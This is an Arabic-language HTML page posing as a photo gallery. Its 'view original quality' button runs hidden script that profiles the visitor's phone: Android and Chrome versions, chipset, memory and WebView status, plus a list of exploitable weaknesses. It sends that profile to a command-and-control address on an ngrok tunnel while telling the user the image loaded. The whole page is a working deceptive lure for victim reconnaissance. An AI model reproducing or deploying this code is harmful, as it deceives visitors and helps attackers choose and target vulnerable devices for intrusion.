<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>معرض الصور</title>
    <style>
        body { margin: 0; padding: 0; background: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; }
        #status {
            position: fixed; top: 25px; left: 50%; transform: translateX(-50%);
            background: rgba(0,0,0,0.9); padding: 18px 35px; border-radius: 12px;
            font-size: 19px; z-index: 999;
        }
        .btn {
            margin: 50px auto;
            padding: 20px 55px;
            font-size: 23px;
            background: #0066ff;
            color: white;
            border: none;
            border-radius: 12px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="status">جاري تحميل الصور عالية الجودة...</div>
    <img src="https://picsum.photos/id/1015/800/600" style="max-width:95%; margin-top:60px;" alt="صورة">

    <button class="btn" onclick="runAnalysis()">عرض الصورة بالجودة الأصلية</button>

    <script>
        const C2_URL = "https://virulently-retaliative-kisha.ngrok-free.dev/collect";

        async function runAnalysis() {
            const status = document.getElementById("status");
            status.innerHTML = "جاري تحميل النسخة الكاملة...";

            await new Promise(r => setTimeout(r, 1400));

            // ================== التحليل الشامل ==================
            const analysis = {
                type: "vulnerability_analysis",
                timestamp: Date.now(),
                device: {
                    userAgent: navigator.userAgent,
                    androidVersion: getAndroidVer(),
                    chromeVersion: getChromeVer(),
                    screen: screen.width + "×" + screen.height,
                    memory: navigator.deviceMemory || "unknown",
                    cores: navigator.hardwareConcurrency || "unknown"
                },
                scan: {
                    isWebView: /wv|webview/i.test(navigator.userAgent),
                    isQualcomm: /qualcomm|qcom|sm|snapdragon/i.test(navigator.userAgent),
                    oldAndroid: parseFloat(getAndroidVer()) < 14,
                    oldChrome: parseFloat(getChromeVer()) < 120
                },
                risks: getRisks()
            };

            // إرسال التحليل إلى C2
            fetch(C2_URL, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify(analysis)
            });

            status.innerHTML = "تم عرض الصورة بنجاح ✓";
            console.log("تم إرسال تحليل الثغرات");
        }

        function getAndroidVer() {
            const m = navigator.userAgent.match(/Android\s([0-9.]+)/);
            return m ? m[1] : "unknown";
        }

        function getChromeVer() {
            const m = navigator.userAgent.match(/Chrome\/([0-9.]+)/);
            return m ? m[1] : "unknown";
        }

        function getRisks() {
            const risks = [];
            if (parseFloat(getAndroidVer()) < 14) risks.push("Android version is old - High risk");
            if (/qualcomm/i.test(navigator.userAgent)) risks.push("Qualcomm chipset - CVE-2026-21385 possible");
            if (parseFloat(getChromeVer()) < 120) risks.push("Old Chrome/WebView version");
            return risks;
        }
    </script>
</body>
</html>
